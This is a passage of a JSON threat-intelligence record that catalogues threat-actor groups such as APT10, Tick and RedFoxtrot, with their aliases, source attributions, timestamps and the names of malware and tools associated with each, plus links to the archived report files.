            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8a3bd03a-f69b-455b-b88b-3842a3528bfd",
            "created_at": "2022-10-25T16:07:24.178007Z",
            "updated_at": "2025-03-27T02:02:10.132529Z",
            "deleted_at": null,
            "main_name": "SharpPanda",
            "aliases": [
                "Sharp Dragon",
                "SharpPanda"
            ],
            "source_name": "ETDA:SharpPanda",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "RoyalRoad",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1aead86d-0c57-4e3b-b464-a69f6de20cde",
            "created_at": "2023-01-06T13:46:38.318176Z",
            "updated_at": "2025-03-27T02:00:02.803684Z",
            "deleted_at": null,
            "main_name": "DAGGER PANDA",
            "aliases": [
                "IceFog",
                "RedFoxtrot",
                "Red Wendigo",
                "PLA Unit 69010"
            ],
            "source_name": "MISPGALAXY:DAGGER PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a9ee8219-1882-4b1b-bac8-641b1603787d",
            "created_at": "2022-10-25T15:50:23.78263Z",
            "updated_at": "2025-03-27T02:00:55.545647Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "APT30"
            ],
            "source_name": "MITRE:APT30",
            "tools": [
                "SHIPSHAPE",
                "FLASHFLOOD",
                "NETEAGLE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b98eb1ec-dc8b-4aea-b112-9e485408dd14",
            "created_at": "2022-10-25T16:07:23.649308Z",
            "updated_at": "2025-03-27T02:02:09.906895Z",
            "deleted_at": null,
            "main_name": "FunnyDream",
            "aliases": [
                "Bronze Edgewood",
                "Red Hariasa",
                "TAG-16"
            ],
            "source_name": "ETDA:FunnyDream",
            "tools": [
                "Chinoxy",
                "Filepak",
                "FilepakMonitor",
                "FunnyDream",
                "Keyrecord",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Md_client",
                "PCShare",
                "ScreenCap",
                "TcpBridge",
                "Tcp_transfer",
                "ccf32"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "30ed778d-15b3-484e-a90b-e1e05b36a42f",
            "created_at": "2023-01-06T13:46:38.290626Z",
            "updated_at": "2025-03-27T02:00:02.795711Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "G0013"
            ],
            "source_name": "MISPGALAXY:APT30",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ad154227-6fcf-43c5-a540-0c09534e040f",
            "created_at": "2024-05-01T02:03:07.952927Z",
            "updated_at": "2025-03-27T02:05:17.267077Z",
            "deleted_at": null,
            "main_name": "BRONZE GENEVA",
            "aliases": [
                "BRONZE STERLING ",
                "CTG-5326 ",
                "Naikon ",
                "Override Panda ",
                "APT30 "
            ],
            "source_name": "Secureworks:BRONZE GENEVA",
            "tools": [
                " ShadowPad",
                "Lecna"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bbb1ee4e-bbe9-44de-8f46-8e7fec09f695",
            "created_at": "2022-10-25T16:07:24.120424Z",
            "updated_at": "2025-03-27T02:02:10.112981Z",
            "deleted_at": null,
            "main_name": "RedFoxtrot",
            "aliases": [
                "Moshen Dragon",
                "Nomad Panda",
                "TEMP.Trident"
            ],
            "source_name": "ETDA:RedFoxtrot",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Fucobha",
                "GUNTERS",
                "Gen:Trojan.Heur.PT",
                "Icefog",
                "Impacket",
                "Kaba",
                "Korplug",
                "PCShare",
                "POISONPLUG.SHADOW",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "XShellGhost",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1680660499,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1680510395,
    "ts_modification_date": 1680510395,
    "files": {
        "pdf": "https://archive.orkl.eu/6bd1fecf0cd44e4bfe7461bbee05bef6c874b2ac.pdf",
        "text": "https://archive.orkl.eu/6bd1fecf0cd44e4bfe7461bbee05bef6c874b2ac.txt",
        "img": "https://archive.orkl.eu/6bd1fecf0cd44e4bfe7461bbee05bef6c874b2ac.jpg"
    }
}